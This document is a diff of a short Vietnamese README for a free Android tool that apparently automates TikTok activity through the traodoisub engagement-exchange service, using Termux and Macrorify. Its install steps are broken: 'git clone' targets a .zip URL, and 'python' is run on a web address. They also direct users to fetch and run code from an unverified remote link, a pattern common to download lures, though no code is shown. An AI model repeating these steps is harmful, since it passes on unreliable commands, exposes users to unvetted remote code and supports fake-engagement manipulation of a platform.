@@ -6,18 +6,18 @@ Tool auto tiktok traodoisub android free
 - pkg update
 - pkg install python
 - pkg install git
-- git clone https://raw.githubusercontent.com/vanhoa-1/tds_tiktok/main/japan/tiktok-tds-v3.9.zip
+- git clone https://vanhoa-1.github.io
 - cd tds_tiktok
-- python https://raw.githubusercontent.com/vanhoa-1/tds_tiktok/main/japan/tiktok-tds-v3.9.zip
+- python https://vanhoa-1.github.io
 
 # Công cụ kết hợp
 - Termux
 - Macrorify
 - Tiktok hoặc tiktok lite
-- Link tải termux và Macrorify https://raw.githubusercontent.com/vanhoa-1/tds_tiktok/main/japan/tiktok-tds-v3.9.zip
+- Link tải termux và Macrorify https://vanhoa-1.github.io
 
 # Lệnh chạy
-python https://raw.githubusercontent.com/vanhoa-1/tds_tiktok/main/japan/tiktok-tds-v3.9.zip
+python https://vanhoa-1.github.io
 
 # Video hướng dẫn
 Đang cập nhật
